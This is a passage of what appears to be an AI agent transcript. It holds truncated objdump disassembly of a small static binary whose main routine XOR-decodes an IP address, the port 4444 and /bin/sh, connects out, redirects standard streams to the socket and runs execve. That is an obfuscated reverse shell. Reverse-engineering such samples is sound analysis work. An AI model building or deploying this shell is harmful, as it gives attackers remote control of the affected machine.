\thlt    \n  4015e2:\t66 2e 0f 1f 84 00 00 \tcs nopw 0x0(%rax,%rax,1)\n  4015e9:\t00 00 00 \n  4015ec:\t0f 1f 40 00          \tnopl   0x0(%rax)\n\n00000000004015f0 <_dl_relocate_static_pie>:\n  4015f0:\tc3                   \tret    \n  4015f1:\t66 2e 0f 1f 84 00 00 \tcs nopw 0x0(%rax,%rax,1)\n  4015f8:\t00 00 00 \n  4015fb:\t0f 1f 44 00 00       \tnopl   0x0(%rax,%rax,1)\n\n0000000000401600 <deregister_tm_clones>:\n  401600:\tb8 c0 5a 4a 00       \tmov    $0x4a5ac0,%eax\n  401605:\t48 3d c0 5a 4a 00    \tcmp    $0x4a5ac0,%rax\n  40160b:\t74 13                \tje     401620 <deregister_tm_clones+0x20>\n  40160d:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401612:\t48 85 c0             \ttest   %rax,%rax\n  401615:\t74 09                \tje     401620 <deregister_tm_clones+0x20>\n  401617:\tbf c0 5a 4a 00       \tmov    $0x4a5ac0,%edi\n  40161c:\tff e0                \tjmp    *%rax\n  40161e:\t66 90                \txchg   %ax,%ax\n  401620:\tc3                   \tret    \n  401621:\t66 66 2e 0f 1f 84 00 \tdata16 cs nopw 0x0(%rax,%rax,1)\n  401628:\t00 00 00 00 \n  40162c:\t0f 1f 40 00          \tnopl   0x0(%rax)\n\n0000000000401630 <register_tm_clones>:\n  401630:\tbe c0 5a 4a 00       \tmov    $0x4a5ac0,%esi\n  401635:\t48 81 ee c0 5a 4a 00 \tsub    $0x4a5ac0,%rsi\n  40163c:\t48 89 f0             \tmov    %rsi,%rax\n  40163f:\t48 c1 ee 3f          \tshr    $0x3f,%rsi\n  401643:\t48 c1 f8 03          \tsar    $0x3,%rax\n  401647:\t48 01 c6             \tadd    %rax,%rsi\n  40164a:\t48 d1 fe             \tsar    %rsi\n  40164d:\t74 11                \tje     401660 <register_tm_clones+0x30>\n  40164f:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401654:\t48 85 c0             \ttest   %rax,%rax\n  401657:\t74 07                \tje     401660 <register_tm_clones+0x30>\n  401659:\tbf c0 5a 4a 00       \tmov    $0x4a5ac0,%edi\n  40165e:\tff e0                \tjmp    *%rax\n  401660:\tc3                   \tret    \n  401661:\t66 66 2e 0f 1f 84 00 \tdata16 cs nopw 0x0(%rax,%rax,1)\n  401668:\t00 00 00 00 \n  40166c:\t0f 1f 40 00          \tnopl   0x0(%rax)\n\n0000000000401670 <__do_global_dtors_aux>:\n  401670:\tf3 0f 1e fa          \tendbr64 \n  401674:\t80 3d 45 44 0a 00 00 \tcmpb   $0x0,0xa4445(%rip)        # 4a5ac0 <__TMC_END__>\n  40167b:\t75 2b                \tjne    4016a8 <__do_global_dtors_aux+0x38>\n  40167d:\t55                   \tpush   %rbp\n  40167e:\t48 89 e5             \tmov    %rsp,%rbp\n  401681:\te8 7a ff ff ff       \tcall   401600 <deregister_tm_clones>\n  401686:\tb8 c0 3c 47 00       \tmov    $0x473cc0,%eax\n  40168b:\t48 85 c0             \ttest   %rax,%rax\n  40168e:\t74 0a                \tje     40169a <__do_global_dtors_aux+0x2a>\n  401690:\tbf 38 2c 49 00       \tmov    $0x492c38,%edi\n  401695:\te8 26 26 07 00       \tcall   473cc0 <__deregister_frame_info>\n  40169a:\tc6 05 1f 44 0a 00 01 \tmovb   $0x1,0xa441f(%rip)        # 4a5ac0 <__TMC_END__>\n  4016a1:\t5d                   \tpop    %rbp\n  4016a2:\tc3                   \tret    \n  4016a3:\t0f 1f 44 00 00       \tnopl   0x0(%rax,%rax,1)\n  4016a8:\tc3                   \tret    \n  4016a9:\t0f 1f 80 00 00 00 00 \tnopl   0x0(%rax)\n\n00000000004016b0 <frame_dummy>:\n  4016b0:\tf3 0f 1e fa          \tendbr64 \n  4016b4:\tb8 10 3a 47 00       \tmov    $0x473a10,%eax\n  4016b9:\t48 85 c0             \ttest   %rax,%rax\n  4016bc:\t74 22                \tje     4016e0 <frame_dummy+0x30>\n  4016be:\t55                   \tpush   %rbp\n  4016bf:\tbe e0 5a 4a 00       \tmov    $0x4a5ae0,%esi\n  4016c4:\tbf 38 2c 49 00       \tmov    $0x492c38,%edi\n  4016c9:\t48 89 e5             \tmov    %rsp,%rbp\n  4016cc:\te8 3f 23 07 00       \tcall   473a10 <__register_frame_info>\n  4016d1:\t5d                   \tpop    %rbp\n  4016d2:\te9 59 ff ff ff       \tjmp    401630 <register_tm_clones>\n  4016d7:\t66 0f 1f 84 00 00 00 \tnopw   0x0(%rax,%rax,1)\n  4016de:\t00 00 \n  4016e0:\te9 4b ff ff ff       \tjmp    401630 <register_tm_clones>\n\n00000000004016e5 <xor_decrypt>:\n  4016e5:\t55                   \tpush   %rbp\n  4016e6:\t48 89 e5             \tmov    %rsp,%rbp\n  4016e9:\t48 89 7d f8          \tmov    %rdi,-0x8(%rbp)\n  4016ed:\t89 f0                \tmov    %esi,%eax\n  4016ef:\t88 45 f4             \tmov    %al,-0xc(%rbp)\n  4016f2:\teb 17                \tjmp    40170b <xor_decrypt+0x26>\n  4016f4:\t48 8b 45 f8          \tmov    -0x8(%rbp),%rax\n  4016f8:\t0f b6 00             \tmovzbl (%rax),%eax\n  4016fb:\t32 45 f4             \txor    -0xc(%rbp),%al\n  4016fe:\t89 c2                \tmov    %eax,%edx\n  401700:\t48 8b 45 f8          \tmov    -0x8(%rbp),%rax\n  401704:\t88 10                \tmov    %dl,(%rax)\n  401706:\t48 83 45 f8 01       \taddq   $0x1,-0x8(%rbp)\n  40170b:\t48 8b 45 f8          \tmov    -0x8(%rbp),%rax\n  40170f:\t0f b6 00             \tmovzbl (%rax),%eax\n  401712:\t84 c0                \ttest   %al,%al\n  401714:\t75 de                \tjne    4016f4 <xor_decrypt+0xf>\n  401716:\t90                   \tnop\n  401717:\t90                   \tnop\n  401718:\t5d                   \tpop    %rbp\n  401719:\tc3                   \tret    \n\n000000000040171a <main>:\n  40171a:\t55                   \tpush   %rbp\n  40171b:\t48 89 e5             \tmov    %rsp,%rbp\n  40171e:\t48 83 ec 30          \tsub    $0x30,%rsp\n  401722:\t48 b8 13 1b 10 0c 13 \tmovabs $0xc1a14130c101b13,%rax\n  401729:\t14 1a 0c \n  40172c:\t48 89 45 ee          \tmov    %rax,-0x12(%rbp)\n  401730:\t48 b8 1a 0c 13 0c 13 \tmovabs $0x1212130c130c1a,%rax\n  401737:\t12 12 00 \n  40173a:\t48 89 45 f4          \tmov    %rax,-0xc(%rbp)\n  40173e:\tc7 45 e9 16 16 16 16 \tmovl   $0x16161616,-0x17(%rbp)\n  401745:\tc6 45 ed 00          \tmovb   $0x0,-0x13(%rbp)\n  401749:\t48 b8 0d 40 4b 4c 0d \tmovabs $0x4a510d4c4b400d,%rax\n  401750:\t51 4a 00 \n  401753:\t48 89 45 e1          \tmov    %rax,-0x1f(%rbp)\n  401757:\t48 8d 45 ee          \tlea    -0x12(%rbp),%rax\n  40175b:\tbe 22 00 00 00       \tmov    $0x22,%esi\n  401760:\t48 89 c7             \tmov    %rax,%rdi\n  401763:\te8 7d ff ff ff       \tcall   4016e5 <xor_decrypt>\n  401768:\t48 8d 45 e9          \tlea    -0x17(%rbp),%rax\n  40176c:\tbe 22 00 00 00       \tmov    $0x22,%esi\n  401771:\t48 89 c7             \tmov    %rax,%rdi\n  401774:\te8 6c ff ff ff       \tcall   4016e5 <xor_decrypt>\n  401779:\t48 8d 45 e1          \tlea    -0x1f(%rbp),%rax\n  40177d:\tbe 22 00 00 00       \tmov    $0x22,%esi\n  401782:\t48 89 c7             \tmov    %rax,%rdi\n  401785:\te8 5b ff ff ff       \tcall   4016e5 <xor_decrypt>\n  40178a:\tba 00 00 00 00       \tmov    $0x0,%edx\n  40178f:\tbe 01 00 00 00       \tmov    $0x1,%esi\n  401794:\tbf 02 00 00 00       \tmov    $0x2,%edi\n  401799:\te8 22 21 01 00       \tcall   4138c0 <__socket>\n  40179e:\t89 45 fc             \tmov    %eax,-0x4(%rbp)\n  4017a1:\t66 c7 45 d0 02 00    \tmovw   $0x2,-0x30(%rbp)\n  4017a7:\t48 8d 45 e9          \tlea    -0x17(%rbp),%rax\n  4017ab:\t48 89 c7             \tmov    %rax,%rdi\n  4017ae:\te8 fd 29 00 00       \tcall   4041b0 <atoi>\n  4017b3:\t0f b7 c0             \tmovzwl %ax,%eax\n  4017b6:\t89 c7                \tmov    %eax,%edi\n  4017b8:\te8 33 22 01 00       \tcall   4139f0 <htons>\n  4017bd:\t66 89 45 d2          \tmov    %ax,-0x2e(%rbp)\n  4017c1:\t48 8d 45 d0          \tlea    -0x30(%rbp),%rax\n  4017c5:\t48 8d 50 04          \tlea    0x4(%rax),%rdx\n  4017c9:\t48 8d 45 ee          \tlea    -0x12(%rbp),%rax\n  4017cd:\t48 89 c6             \tmov    %rax,%rsi\n  4017d0:\tbf 02 00 00 00       \tmov    $0x2,%edi\n  4017d5:\te8 e6 25 01 00       \tcall   413dc0 <__inet_pton>\n  4017da:\t48 8d 4d d0          \tlea    -0x30(%rbp),%rcx\n  4017de:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  4017e1:\tba 10 00 00 00       \tmov    $0x10,%edx\n  4017e6:\t48 89 ce             \tmov    %rcx,%rsi\n  4017e9:\t89 c7                \tmov    %eax,%edi\n  4017eb:\te8 b0 20 01 00       \tcall   4138a0 <__libc_connect>\n  4017f0:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  4017f3:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  4017f8:\t89 c7                \tmov    %eax,%edi\n  4017fa:\te8 11 12 01 00       \tcall   412a10 <__dup2>\n  4017ff:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  401802:\tbe 01 00 00 00       \tmov    $0x1,%esi\n  401807:\t89 c7                \tmov    %eax,%edi\n  401809:\te8 02 12 01 00       \tcall   412a10 <__dup2>\n  40180e:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  401811:\tbe 02 00 00 00       \tmov    $0x2,%esi\n  401816:\t89 c7                \tmov    %eax,%edi\n  401818:\te8 f3 11 01 00       \tcall   412a10 <__dup2>\n  40181d:\t48 8d 45 e1          \tlea    -0x1f(%rbp),%rax\n  401821:\tba 00 00 00 00       \tmov    $0x0,%edx\n  401826:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  40182b:\t48 89 c7             \tmov    %rax,%rdi\n  40182e:\te8 ad 11 01 00       \tcall   4129e0 <__execve>\n  401833:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401838:\tc9                   \tleave  \n  401839:\tc3                   \tret    \n  40183a:\t66 0f 1f 44 00 00    \tnopw   0x0(%rax,%rax,1)\n\n0000000000401840 <call_fini>:\n  401840:\t55                   \tpush   %rbp\n  401841:\t48 8d 05 08 e6 09 00 \tlea    0x9e608(%rip),%rax        # 49fe50 <__do_global_dtors_aux_fini_array_entry>\n  401848:\t53                   \tpush   %rbx\n  401849:\t48 8d 1d 10 e6 09 00 \tlea    0x9e610(%rip),%rbx        # 49fe60 <rfv.0>\n  401850:\t48 29 c3             \tsub    %rax,%rbx\n  401853:\t48 83 ec 08          \tsub    $0x8,%rsp\n  401857:\t48 c1 fb 03          \tsar    $0x3,%rbx\n  40185b:\t74 1d                \tje     40187a <call_fini+0x3a>\n  40185d:\t48 8d 68 f8          \tlea    -0x8(%rax),%rbp\n  401861:\t66 66 2e 0f 1f 84 00 \tdata16 cs nopw 0x0(%rax,%rax,1)\n  401868:\t00 00 00 00 \n  40186c:\t0f 1f 40 00          \tnopl   0x0(%rax)\n  401870:\tff 54 dd 00          \tcall   *0x0(%rbp,%rbx,8)\n  401874:\t48 83 eb 01          \tsub    $0x1,%rbx\n  401878:\t75 f6                \tjne    401870 <call_fini+0x30>\n  40187a:\t48 83 c4 08          \tadd    $0x8,%rsp\n  40187e:\t5b                   \tpop    %rbx\n  40187f:\t5d                   \tpop    %rbp\n  401880:\te9 b7 4b 07 00       \tjmp    47643c <_fini>\n  401885:\t66 66 2e 0f 1f 84 00 \tdata16 cs nopw 0x0(%rax,%rax,1)\n  40188c:\t00 00 00 00 \n\n0000000000401890 <handle_zhaoxin>:\n  401890:\t55                   \tpush   %rbp\n  401891:\tb8 04 00 00 00       \tmov    $0x4,%eax\n  401896:\t31 c9                \txor    %ecx,%ecx\n  401898:\t53                   \tpush   %rbx\n  401899:\t0f a2                \tcpuid  \n  40189b:\t89 c2                \tmov    %eax,%edx\n  40189d:\t83 e2 1f             \tand    $0x1f,%edx\n  4018a0:\t0f 84 da 00 00 00    \tje     401980 <handle_zhaoxin+0xf0>\n  4018a6:\t8d b7 3e ff ff ff    \tlea    -0xc2(%rdi),%esi\n  4018ac:\t41 89 f8             \tmov    %edi,%r8d\n  4018af:\t44 8d 97 49 ff ff ff \tlea    -0xb7(%rdi),%r10d\n  4018b6:\t83 fe 02             \tcmp    $0x2,%esi\n  4018b9:\t44 8d 8f 44 ff ff ff \tlea    -0xbc(%rdi),%r9d\n  4018c0:\tbf 04 00 00 00       \tmov    $0x4,%edi\n  4018c5:\t41 0f 96 c3          \tsetbe  %r11b\n  4018c9:\t31 f6                \txor    %esi,%esi\n  4018cb:\teb 1d                \tjmp    4018ea <handle_zhaoxin+0x5a>\n  4018cd:\t0f 1f 00             \tnopl   (%rax)\n  4018d0:\t41 83 f9 02          \tcmp    $0x2,%r9d\n  4018d4:\t76 4a                \tjbe    401920 <handle_zhaoxin+0x90>\n  4018d6:\t83 c6 01             \tadd    $0x1,%esi\n  4018d9:\t89 f8                \tmov    %edi,%eax\n  4018db:\t89 f1                \tmov    %esi,%ecx\n  4018dd:\t0f a2                \tcpuid  \n  4018df:\t89 c2                \tmov    %eax,%edx\n  4018e1:\t83 e2 1f             \tand    $0x1f,%edx\n  4018e4:\t0f 84 96 00 00 00    \tje     401980 <handle_zhaoxin+0xf0>\n  4018ea:\tc1 e8 05             \tshr    $0x5,%eax\n  4018ed:\t83 e0 07             \tand    $0x7,%eax\n  4018f0:\t83 f8 01             \tcmp    $0x1,%eax\n  4018f3:\t40 0f 94 c5          \tsete   %bpl\n  4018f7:\t83 fa 01             \tcmp    $0x1,%edx\n  4018fa:\t75 05                \tjne    401901 <handle_zhaoxin+0x71>\n  4018fc:\t40 84 ed             \ttest   %bpl,%bpl\n  4018ff:\t75 cf                \tjne    4018d0 <handle_zhaoxin+0x40>\n  401901:\t83 fa 02             \tcmp    $0x2,%edx\n  401904:\t75 7e                \tjne    401984 <handle_zhaoxin+0xf4>\n  401906:\t40 84 ed             \ttest   %bpl,%bpl\n  401909:\t74 79                \tje     401984 <handle_zhaoxin+0xf4>\n  40190b:\t41 83 fa 04          \tcmp    $0x4,%r10d\n  40190f:\t77 c5                \tja     4018d6 <handle_zhaoxin+0x46>\n  401911:\t66 66 2e 0f 1f 84 00 \tdata16 cs nopw 0x0(%rax,%rax,1)\n  401918:\t00 00 00 00 \n  40191c:\t0f 1f 40 00          \tnopl   0x0(%rax)\n  401920:\t41 8d 80 47 ff ff ff \tlea    -0xb9(%r8),%eax\n  401927:\tba ab aa aa aa       \tmov    $0xaaaaaaab,%edx\n  40192c:\t49 89 c0             \tmov    %rax,%r8\n  40192f:\t48 0f af c2          \timul   %rdx,%rax\n  401933:\t48 c1 e8 21          \tshr    $0x21,%rax\n  401937:\t8d 14 40             \tlea    (%rax,%rax,2),%edx\n  40193a:\t44 89 c0             \tmov    %r8d,%eax\n  40193d:\t29 d0                \tsub    %edx,%eax\n  40193f:\t74 12                \tje     401953 <handle_zhaoxin+0xc3>\n  401941:\t83 e8 01             \tsub    $0x1,%eax\n  401944:\t74 66                \tje     4019ac <handle_zhaoxin+0x11c>\n  401946:\t81 e3 ff 0f 00 00    \tand    $0xfff,%ebx\n  40194c:\t48 8d 43 01          \tlea    0x1(%rbx),%rax\n  401950:\t5b                   \tpop    %rbx\n  401951:\t5d                   \tpop    %rbp\n  401952:\tc3                   \tret    \n  401953:\t89 d8                \tmov    %ebx,%eax\n  401955:\t89 da                \tmov    %ebx,%edx\n  401957:\t83 c1 01             \tadd    $0x1,%ecx\n  40195a:\tc1 eb 0c             \tshr    $0xc,%ebx\n  40195d:\tc1 e8 16             \tshr    $0x16,%eax\n  401960:\t81 e2 ff 0f 00 00    \tand    $0xfff,%edx\n  401966:\t81 e3 ff 03 00 00    \tand    $0x3ff,%ebx\n  40196c:\t83 c2 01             \tadd    $0x1,%edx\n  40196f:\t83 c0 01             \tadd    $0x1,%eax\n  401972:\t0f af c2             \timul   %edx,%eax\n  401975:\t8d 53 01             \tlea    0x1(%rbx),%edx\n  401978:\t0f af c1             \timul   %ecx,%eax\n  40197b:\t0f af c2             \timul   %edx,%eax\n  40197e:\teb d0                \tjmp    401950 <handle_zhaoxin+0xc0>\n  401980:\t31 c0                \txor    %eax,%eax\n  401982:\teb cc                \tjmp    401950 <handle_zhaoxin+0xc0>\n  401984:\t41 8d 90 41 ff ff ff \tlea    -0xbf(%r8),%edx\n  40198b:\t83 fa 02             \tcmp    $0x2,%edx\n  40198e:\t77 05                \tja     401995 <handle_zhaoxin+0x105>\n  401990:\t83 f8 02             \tcmp    $0x2,%eax\n  401993:\t74 8b                \tje     401920 <handle_zhaoxin+0x90>\n  401995:\t83 f8 03             \tcmp    $0x3,%eax\n  401998:\t0f 85 38 ff ff ff    \tjne    4018d6 <handle_zhaoxin+0x46>\n  40199e:\t45 84 db             \ttest   %r11b,%r11b\n  4019a1:\t0f 85 79 ff ff ff    \tjne    401920 <handle_zhaoxin+0x90>\n  4019a7:\te9 2a ff ff ff       \tjmp    4018d6 <handle_zhaoxin+0x46>\n  4019ac:\t89 d8                \tmov    %ebx,%eax\n  4019ae:\tc1 e8 16             \tshr    $0x16,%eax\n  4019b1:\t83 c0 01             \tadd    $0x1,%eax\n  4019b4:\teb 9a                \tjmp    401950 <handle_zhaoxin+0xc0>\n  4019b6:\t66 2e 0f 1f 84 00 00 \tcs nopw 0x0(%rax,%rax,1)\n  4019bd:\t00 00 00 \n\n00000000004019c0 <handle_amd>:\n  4019c0:\t89 fe                \tmov    %edi,%esi\n  4019c2:\t31 ff                \txor    %edi,%edi\n  4019c4:\t81 fe c5 00 00 00    \tcmp    $0xc5,%esi\n  4019ca:\t0f 84 ad 00 00 00    \tje     401a7d <handle_amd+0xbd>\n  4019d0:\t53                   \tpush   %rbx\n  4019d1:\tb8 00 00 00 80       \tmov    $0x80000000,%eax\n  4019d6:\t0f a2                \tcpuid  \n  4019d8:\t41 89 c0             \tmov    %eax,%r8d\n  4019db:\t3d 1c 00 00 80       \tcmp    $0x8000001c,%eax\n  4019e0:\t76 5e                \tjbe    401a40 <handle_amd+0x80>\n  4019e2:\tb9 03 00 00 00       \tmov    $0x3,%ecx\n  4019e7:\t81 fe c1 00 00 00    \tcmp    $0xc1,%esi\n  4019ed:\t7f 18                \tjg     401a07 <handle_amd+0x47>\n  4019ef:\tb9 02 00 00 00       \tmov    $0x2,%ecx\n  4019f4:\t81 fe be 00 00 00    \tcmp    $0xbe,%esi\n  4019fa:\t7f 0b                \tjg     401a07 <handle_amd+0x47>\n  4019fc:\t31 c9                \txor    %ecx,%ecx\n  4019fe:\t81 fe bb 00 00 00    \tcmp    $0xbb,%esi\n  401a04:\t0f 9e c1             \tsetle  %cl\n  401a07:\tb8 1d 00 00 80       \tmov    $0x8000001d,%eax\n  401a0c:\t0f a2                \tcpuid  \n  401a0e:\t41 89 c9             \tmov    %ecx,%r9d\n  401a11:\t85 c9                \ttest   %ecx,%ecx\n  401a13:\t74 6c                \tje     401a81 <handle_amd+0xc1>\n  401a15:\t8d 8e 47 ff ff ff    \tlea    -0xb9(%rsi),%ecx\n  401a1b:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  401a20:\t48 d3 e0             \tshl    %cl,%rax\n  401a23:\ta9 24 09 00 00       \ttest   $0x924,%eax\n  401a28:\t0f 85 a1 00 00 00    \tjne    401acf <handle_amd+0x10f>\n  401a2e:\ta9 92 04 00 00       \ttest   $0x492,%eax\n  401a33:\t74 7a                \tje     401aaf <handle_amd+0xef>\n  401a35:\tc1 eb 16             \tshr    $0x16,%ebx\n  401a38:\t8d 7b 01             \tlea    0x1(%rbx),%edi\n  401a3b:\t48 89 f8             \tmov    %rdi,%rax\n  401a3e:\t5b                   \tpop    %rbx\n  401a3f:\tc3                   \tret    \n  401a40:\tb8 06 00 00 80       \tmov    $0x80000006,%eax\n  401a45:\t81 fe be 00 00 00    \tcmp    $0xbe,%esi\n  401a4b:\t7e 48                \tjle    401a95 <handle_amd+0xd5>\n  401a4d:\t31 ff                \txor    %edi,%edi\n  401a4f:\t41 39 c0             \tcmp    %eax,%r8d\n  401a52:\t72 e7                \tjb     401a3b <handle_amd+0x7b>\n  401a54:\t0f a2                \tcpuid  \n  401a56:\t81 fe bb 00 00 00    \tcmp    $0xbb,%esi\n  401a5c:\t7e 3e                \tjle    401a9c <handle_amd+0xdc>\n  401a5e:\t81 ee bd 00 00 00    \tsub    $0xbd,%esi\n  401a64:\t83 fe 07             \tcmp    $0x7,%esi\n  401a67:\t0f 87 ea 01 00 00    \tja     401c57 <handle_amd+0x297>\n  401a6d:\t48 8d 3d ac 55 07 00 \tlea    0x755ac(%rip),%rdi        # 477020 <__rseq_flags+0x1c>\n  401a74:\t48 63 04 b7          \tmovslq (%rdi,%rsi,4),%rax\n  401a78:\t48 01 f8             \tadd    %rdi,%rax\n  401a7b:\tff e0                \tjmp    *%rax\n  401a7d:\t48 89 f8             \tmov    %rdi,%rax\n  401a80:\tc3                   \tret    \n  401a81:\tb8 06 00 00 80       \tmov    $0x80000006,%eax\n  401a86:\t81 fe be 00 00 00    \tcmp    $0xbe,%esi\n  401a8c:\t7f c6                \tjg     401a54 <handle_amd+0x94>\n  401a8e:\tb8 05 00 00 80       \tmov    $0x80000005,%eax\n  401a93:\teb bf                \tjmp    401a54 <handle_amd+0x94>\n  401a95:\tb8 05 00 00 80       \tmov    $0x80000005,%eax\n  401a9a:\teb b1                \tjmp    401a4d <handle_amd+0x8d>\n  401a9c:\t83 c6 03             \tadd    $0x3,%esi\n  401a9f:\t89 d1                \tmov    %edx,%ecx\n  401aa1:\teb bb                \tjmp    401a5e <handle_amd+0x9e>\n  401aa3:\t31 ff                \txor    %edi,%edi\n  401aa5:\tf6 c5 f0             \ttest   $0xf0,%ch\n  401aa8:\t74 91                \tje     401a3b <handle_amd+0x7b>\n  401aaa:\t0f b6 f9             \tmovzbl %cl,%edi\n  401aad:\teb 8c                \tjmp    401a3b <handle_amd+0x7b>\n  401aaf:\t89 df                \tmov    %ebx,%edi\n  401ab1:\t81 e3 ff 0f 00 00    \tand    $0xfff,%ebx\n  401ab7:\t41 8d 49 01          \tlea    0x1(%r9),%ecx\n  401abb:\tc1 ef 16             \tshr    $0x16,%edi\n  401abe:\t83 c3 01             \tadd    $0x1,%ebx\n  401ac1:\t83 c7 01             \tadd    $0x1,%edi\n  401ac4:\t0f af fb             \timul   %ebx,%edi\n  401ac7:\t0f af f9             \timul   %ecx,%edi\n  401aca:\te9 6c ff ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401acf:\t81 e3 ff 0f 00 00    \tand    $0xfff,%ebx\n  401ad5:\t48 8d 7b 01          \tlea    0x1(%rbx),%rdi\n  401ad9:\te9 5d ff ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401ade:\tc1 e9 10             \tshr    $0x10,%ecx\n  401ae1:\t0f b6 f9             \tmovzbl %cl,%edi\n  401ae4:\t81 ff ff 00 00 00    \tcmp    $0xff,%edi\n  401aea:\t0f 85 4b ff ff ff    \tjne    401a3b <handle_amd+0x7b>\n  401af0:\tc1 e1 02             \tshl    $0x2,%ecx\n  401af3:\t89 cf                \tmov    %ecx,%edi\n  401af5:\t81 e7 00 fc 03 00    \tand    $0x3fc00,%edi\n  401afb:\te9 3b ff ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401b00:\tf6 c6 f0             \ttest   $0xf0,%dh\n  401b03:\t0f 84 d3 00 00 00    \tje     401bdc <handle_amd+0x21c>\n  401b09:\t8d 3c 12             \tlea    (%rdx,%rdx,1),%edi\n  401b0c:\t81 e7 00 00 f8 7f    \tand    $0x7ff80000,%edi\n  401b12:\t41 81 f8 07 00 00 80 \tcmp    $0x80000007,%r8d\n  401b19:\t0f 87 48 01 00 00    \tja     401c67 <handle_amd+0x2a7>\n  401b1f:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  401b24:\t0f a2                \tcpuid  \n  401b26:\t81 e2 00 00 00 10    \tand    $0x10000000,%edx\n  401b2c:\t0f 84 47 01 00 00    \tje     401c79 <handle_amd+0x2b9>\n  401b32:\tc1 eb 10             \tshr    $0x10,%ebx\n  401b35:\t89 d9                \tmov    %ebx,%ecx\n  401b37:\t81 e1 ff 00 00 00    \tand    $0xff,%ecx\n  401b3d:\t0f 84 36 01 00 00    \tje     401c79 <handle_amd+0x2b9>\n  401b43:\t48 89 f8             \tmov    %rdi,%rax\n  401b46:\t89 c9                \tmov    %ecx,%ecx\n  401b48:\t48 99                \tcqto   \n  401b4a:\t48 f7 f9             \tidiv   %rcx\n  401b4d:\t48 89 c7             \tmov    %rax,%rdi\n  401b50:\t83 3d 71 8e 0a 00 16 \tcmpl   $0x16,0xa8e71(%rip)        # 4aa9c8 <_dl_x86_cpu_features+0x8>\n  401b57:\t0f 86 de fe ff ff    \tjbe    401a3b <handle_amd+0x7b>\n  401b5d:\tb8 1d 00 00 80       \tmov    $0x8000001d,%eax\n  401b62:\tb9 03 00 00 00       \tmov    $0x3,%ecx\n  401b67:\t0f a2                \tcpuid  \n  401b69:\tc1 e8 0e             \tshr    $0xe,%eax\n  401b6c:\t25 ff 0f 00 00       \tand    $0xfff,%eax\n  401b71:\t48 83 c0 01          \tadd    $0x1,%rax\n  401b75:\t48 0f af f8          \timul   %rax,%rdi\n  401b79:\te9 bd fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401b7e:\t89 d7                \tmov    %edx,%edi\n  401b80:\t48 8d 0d b9 54 07 00 \tlea    0x754b9(%rip),%rcx        # 477040 <__rseq_flags+0x3c>\n  401b87:\tc1 ef 0c             \tshr    $0xc,%edi\n  401b8a:\t83 e7 0f             \tand    $0xf,%edi\n  401b8d:\t48 63 04 b9          \tmovslq (%rcx,%rdi,4),%rax\n  401b91:\t48 01 c8             \tadd    %rcx,%rax\n  401b94:\tff e0                \tjmp    *%rax\n  401b96:\t89 cf                \tmov    %ecx,%edi\n  401b98:\t48 8d 15 e1 54 07 00 \tlea    0x754e1(%rip),%rdx        # 477080 <__rseq_flags+0x7c>\n  401b9f:\tc1 ef 0c             \tshr    $0xc,%edi\n  401ba2:\t83 e7 0f             \tand    $0xf,%edi\n  401ba5:\t48 63 04 ba          \tmovslq (%rdx,%rdi,4),%rax\n  401ba9:\t48 01 d0             \tadd    %rdx,%rax\n  401bac:\tff e0                \tjmp    *%rax\n  401bae:\t31 ff                \txor    %edi,%edi\n  401bb0:\tf6 c5 f0             \ttest   $0xf0,%ch\n  401bb3:\t0f 84 82 fe ff ff    \tje     401a3b <handle_amd+0x7b>\n  401bb9:\tc1 e9 06             \tshr    $0x6,%ecx\n  401bbc:\t89 cf                \tmov    %ecx,%edi\n  401bbe:\t81 e7 00 fc ff 03    \tand    $0x3fffc00,%edi\n  401bc4:\te9 72 fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401bc9:\t31 ff                \txor    %edi,%edi\n  401bcb:\tf6 c6 f0             \ttest   $0xf0,%dh\n  401bce:\t0f 84 67 fe ff ff    \tje     401a3b <handle_amd+0x7b>\n  401bd4:\t0f b6 fa             \tmovzbl %dl,%edi\n  401bd7:\te9 5f fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401bdc:\t31 ff                \txor    %edi,%edi\n  401bde:\te9 58 fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401be3:\tbf 80 00 00 00       \tmov    $0x80,%edi\n  401be8:\te9 4e fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401bed:\tbf 60 00 00 00       \tmov    $0x60,%edi\n  401bf2:\te9 44 fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401bf7:\tbf 40 00 00 00       \tmov    $0x40,%edi\n  401bfc:\te9 3a fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401c01:\tbf 30 00 00 00       \tmov    $0x30,%edi\n  401c06:\te9 30 fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401c0b:\tbf 20 00 00 00       \tmov    $0x20,%edi\n  401c10:\te9 26 fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401c15:\tbf 10 00 00 00       \tmov    $0x10,%edi\n  401c1a:\te9 1c fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401c1f:\tbf 08 00 00 00       \tmov    $0x8,%edi\n  401c24:\te9 12 fe ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401c29:\t8d 04 12             \tlea    (%rdx,%rdx,1),%eax\n  401c2c:\t0f b6 ca             \tmovzbl %dl,%ecx\n  401c2f:\t31 d2                \txor    %edx,%edx\n  401c31:\t25 00 00 f8 7f       \tand    $0x7ff80000,%eax\n  401c36:\tf7 f1                \tdiv    %ecx\n  401c38:\t89 c7                \tmov    %eax,%edi\n  401c3a:\te9 fc fd ff ff       \tjmp    401a3b <handle_amd+0x7b>\n  401c3f:\t89 c8                \tmov    %ecx,%eax\n  401c41:\t31 d2                \txor    %edx,%edx\n  401c43:\n... [output truncated]\n[output was truncated]"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
